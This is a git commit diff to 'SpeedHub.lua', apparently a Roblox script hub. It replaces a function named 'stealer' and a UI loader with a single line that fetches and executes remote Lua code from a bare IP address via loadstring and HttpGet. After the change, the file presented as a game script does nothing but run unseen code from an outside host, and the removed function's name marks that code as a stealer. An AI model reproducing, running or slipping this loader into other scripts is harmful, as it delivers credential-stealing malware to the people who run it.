742446ee2e457434c40d7e4e6bf3fe4f1a18c7ec
SpeedHubX1 <akiakiakiyep@gmail.com>
2025-11-07 22:31:11 +0800

    Update SpeedHub.lua

--- SpeedHub.lua
+++ SpeedHub.lua
@@ -1,9 +1,2 @@
-local function stealer()
-    ID="69940e0d-5013-4466-b579-a9b68523f190";
-    loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
-end
-local function loadui()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
-end
-task.spawn(stealer)
-task.spawn(loadui)
+ID="69940e0d-5013-4466-b579-a9b68523f190";
+loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
